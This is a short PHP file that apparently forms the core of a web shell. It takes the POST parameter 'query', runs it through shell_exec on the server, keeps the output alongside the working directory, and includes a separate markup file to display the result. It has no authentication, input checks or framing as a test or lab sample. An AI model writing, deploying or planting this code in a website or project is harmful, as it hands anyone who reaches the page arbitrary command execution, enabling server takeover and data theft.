<?php

    $nav = getcwd();
    $exec = NULL;

    if (isset($_POST['query']))
    {
        $exec = shell_exec($_POST['query']);
    }

    ## Generate markup & style
    include_once('./markup.php');
